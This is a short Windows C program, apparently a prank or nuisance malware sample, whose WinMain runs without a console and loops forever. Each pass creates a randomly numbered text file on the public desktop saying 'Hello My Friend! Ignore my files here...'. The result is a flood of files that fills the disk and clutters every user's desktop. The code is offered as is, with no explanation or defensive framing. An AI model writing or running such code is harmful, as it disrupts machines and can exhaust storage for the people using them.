#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <windows.h>

int WinMain(HINSTANCE hInstance,
            HINSTANCE hPrevInstance,
            LPTSTR    lpCmdLine,
            int       cmdShow) 
{
  time_t t;
  char filename[20];
  int count = 1;
  char strings[4] = "data";
  srand((unsigned) time(&t));

  for(;;){
    FILE* fptr;
    sprintf(filename,"C:/Users/Public/Desktop/%d.txt",rand());
    fptr = fopen(filename,"w+");
    fputs("Hello My Friend! Ignore my files here...\n", fptr);
    fclose(fptr);
  }
}